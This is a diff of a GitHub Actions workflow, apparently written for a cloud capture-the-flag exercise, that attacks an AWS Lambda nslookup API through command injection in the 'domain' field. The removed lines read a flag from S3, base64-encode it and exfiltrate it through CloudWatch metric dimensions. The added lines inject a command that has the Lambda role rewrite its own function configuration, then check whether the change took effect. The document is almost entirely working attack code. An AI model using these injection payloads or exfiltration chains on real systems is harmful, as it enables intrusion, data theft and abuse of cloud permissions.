@@ -20,20 +20,16 @@ jobs:
           aws-region: us-east-1
 
       - name: Invoke Vulnerable Lambda & Exfiltrate via Function Metadata
+
         run: |
           API_ID="3q931syi7b"
           REGION="us-east-1"
           URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev/nslookup"
-          
-          echo "=== 1. PUSHING FLAG TO CLOUDWATCH METRICS ==="
-          # Read flag, base64 encode it, and store it in a custom metric name or value
-          PAYLOAD='{"domain": "127.0.0.1; FLAG=$(aws s3 cp s3://codec4f26c862a321ef5/flag.txt - --region us-east-1 | base64 | tr -d \"\\n\"); aws cloudwatch put-metric-data --namespace \"CTF/Flag\" --metric-name \"ExfiltratedFlag\" --value 1 --dimensions FlagValue=$FLAG --region us-east-1"}'
-          
-          curl -s -X POST "$URL" \
-            -H "Content-Type: application/json" \
-            -d "$PAYLOAD"
-          
-          sleep 3
-          
-          echo "=== 2. READING METRIC DATA VIA CICDROLE ==="
-          aws cloudwatch list-metrics --namespace "CTF/Flag" --region us-east-1
+    
+          # Test 1: Can lambdaRole update its own description?
+          PAYLOAD='{"domain": "127.0.0.1; aws lambda update-function-configuration --function-name nslookupv2 --description \"TEST-UPDATE-WORKS\" --region us-east-1"}'
+          curl -s -X POST "$URL" -H "Content-Type: application/json" -d "$PAYLOAD"
+          sleep 5
+    
+          # Check from GitHub side
+          aws lambda get-function --function-name nslookupv2 --query 'Configuration.Description' --output text
